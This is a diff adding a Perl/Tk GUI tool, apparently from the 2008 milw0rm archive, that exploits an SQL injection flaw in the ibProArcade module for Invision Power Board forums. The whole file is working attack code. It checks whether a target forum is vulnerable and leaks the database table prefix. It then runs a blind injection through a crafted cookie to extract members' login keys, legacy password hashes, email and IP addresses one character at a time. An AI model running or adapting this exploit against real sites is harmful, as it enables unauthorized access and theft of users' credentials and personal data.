@@ -1,0 +1,230 @@
+#!/usr/bin/perl
+
+## ibProArcade <= v3.3.0 sql injection exploit
+## (c)oded by 1dt.w0lf
+## RST/GHC
+
+##        THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
+##                   KEEP IT PRIVATE
+
+use Tk;
+use Tk::BrowseEntry;
+use Tk::DialogBox;
+use LWP::UserAgent;
+
+BEGIN {
+if($^O eq 'MSWin32'){
+require Win32::Console;
+Win32::Console::Free();
+}
+}
+
+$mw = new MainWindow(title => "r57ibProArcade" );
+
+$mw->geometry ( '420x310' ) ;
+$mw->resizable(0,0);
+
+$mw->Label(-text => '!', -font => '{Webdings} 22')->pack();
+$mw->Label(-text => 'ibProArcade sql injection exploit by RST/GHC', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+$mw->Label(-text => '')->pack();
+
+$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
+$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;
+
+$url = 'http://127.0.0.1/ipb216/index.php';
+$user_id = '1';
+$prefix = 'ibf_';
+$column = 'member_login_key';
+$report = '';
+$true = 0;
+$false = 0;
+
+$fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+$fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$prefix) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+$fright->Label( -text => ' ')->pack();
+$fleft->Label( -text => ' ')->pack();
+
+$fleft->Label ( -text => 'get data from database', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Label( -text => ' ')->pack();
+
+$fleft->Label ( -text => 'Get data from column: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$b = $fright->BrowseEntry( -relief => "groove", -variable => \$column, -font => '{Verdana} 8');
+$b->insert("end", "member_login_key");
+$b->insert("end", "name");
+$b->insert("end", "ip_address");
+$b->insert("end", "legacy_password");
+$b->insert("end", "email");
+$b->pack( -side => "top" , -anchor => 'w' );
+
+$fleft->Label ( -text => 'Returned data: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$report) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+
+$fright->Label( -text => ' ')->pack();
+
+$fright->Button(-text    => 'Test forum vulnerability',
+                -relief => "groove",
+                -width => '30',
+                -font => '{Verdana} 8 bold',
+                -activeforeground => 'red',
+                -command => \&test_vuln
+               )->pack();
+
+$fright->Button(-text    => 'Get database tables prefix',
+                -relief => "groove",
+                -width => '30',
+                -font => '{Verdana} 8 bold',
+                -activeforeground => 'red',
+                -command => \&get_prefix
+               )->pack();
+
+$fright->Button(-text    => 'Get data from database',
+                -relief => "groove",
+                -width => '30',
+                -font => '{Verdana} 8 bold',
+                -activeforeground => 'red',
+                -command => \&get_data
+               )->pack();
+
+
+
+$fleft->Label( -text => ' ')->pack();
+$fleft->Label( -text => '+++ PRIV8 +++', -font => '{Verdana} 7')->pack();
+$fleft->Label( -text => '(c)oded by 1dt.w0lf', -font => '{Verdana} 7')->pack();
+$fleft->Label( -text => 'RST/GHC', -font => '{Verdana} 7')->pack();
+
+MainLoop();
+
+sub get_data()
+{
+$true = &get_true();
+
+$report = '';  
+$s_num=1;
+while(($chr = &found(0,255))!=0){
+$report .= chr($chr);
+$mw->update();
+$s_num++;
+}
+if(length($report) > 0) { &report('That\'s all ;)'); }
+else { &report('Can\'t get data from database'); }
+
+}
+
+sub test_vuln()
+{
+$InfoWindow=$mw->DialogBox(-title   => 'test forum vulnerability', -buttons => ["OK"]);
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+
+$true = &get_true();
+$false = &get_false();
+
+if($true != $false) { $InfoWindow->add('Label', -text => 'FORUM VULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }
+else { $InfoWindow->add('Label', -text => 'FORUM UNVULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'green')->pack; }
+
+$InfoWindow->Show();
+$InfoWindow->destroy;
+}
+
+sub get_true()
+{
+$xpl = LWP::UserAgent->new( ) or die;
+$res = $xpl->get($url."?autocom=arcade&overwrite_sort=added&overwrite_order=,(-gid*(1=1))");
+if($res->as_string =~ /g=(\d+)" target="hiddenframe"><img src=".\/arcade\/images\/addfav.gif"/) { $rep = $1; }
+return $rep;
+}
+
+sub get_false()
+{
+$xpl = LWP::UserAgent->new( ) or die;
+$res = $xpl->get($url."?autocom=arcade&overwrite_sort=added&overwrite_order=,(-gid*(1=2))");
+if($res->as_string =~ /g=(\d+)" target="hiddenframe"><img src=".\/arcade\/images\/addfav.gif"/) { $rep = $1; }
+return $rep;
+}
+ 
+sub get_prefix()
+{
+$InfoWindow=$mw->DialogBox(-title   => 'get database tables prefix', -buttons => ["OK"]);
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+$xpl = LWP::UserAgent->new( ) or die;
+$res = $xpl->get($url."?autocom=arcade&overwrite_sort=added&overwrite_order=r57r0x");
+if($res->is_success)
+ {
+ $rep = '';
+ if($res->as_string =~ /from (.*)games_list/)
+ {
+ $prefix = $1;
+ $InfoWindow->add('Label', -text => 'Prefix: '.$prefix, -font => '{Verdana} 8 bold')->pack;
+ }
+ else
+ {
+ $InfoWindow->add('Label', -text => 'Can\'t get prefix', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }
+ }
+else
+ {
+ $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
+ $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;
+ }
+$InfoWindow->Show();
+$InfoWindow->destroy;  
+}
+
+sub found($$)
+ {
+ my $fmin = $_[0];
+ my $fmax = $_[1];
+ if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }
+ 
+ $r = int($fmax - ($fmax-$fmin)/2);
+ $check = " BETWEEN $r AND $fmax";
+ if ( &check($check) ) { &found($r,$fmax); }
+ else { &found($fmin,$r); }
+ }
+ 
+sub crack($$)
+ {
+ my $cmin = $_[0];
+ my $cmax = $_[1];
+ $i = $cmin;
+ while ($i<$cmax)
+  {
+  $crcheck = "=$i";
+  if ( &check($crcheck) ) { return $i; }
+  $i++;
+  }
+ $i = 0;
+ return $i;
+ }
+ 
+sub check($)
+ {
+ $n++;
+ $rep = '';
+ $ccheck = $_[0];
+ $xpl = LWP::UserAgent->new( ) or die;
+ $res = $xpl->get($url.'?autocom=arcade',cookie=>'g_display_sort=added;g_display_order=,(-gid*(SELECT 1 FROM '.$prefix.'members WHERE (id='.$user_id.' AND ascii(substring('.$column.','.$s_num.',1))'.$ccheck.') LIMIT 1)) LIMIT 1');
+ if($res->as_string =~ /g=(\d+)" target="hiddenframe"><img src=".\/arcade\/images\/addfav.gif"/) { $rep = $1; }
+ if($rep == $true) { return 1; }
+ else { return 0; }
+ }
+ 
+sub report()
+{
+$InfoWindow=$mw->DialogBox(-title   => 'Report', -buttons => ["OK"]);
+$InfoWindow->add('Label', -text => $_[0], -font => '{Verdana} 7')->pack;
+$InfoWindow->Show();
+$InfoWindow->destroy;
+}
+
+# milw0rm.com [2008-01-30]
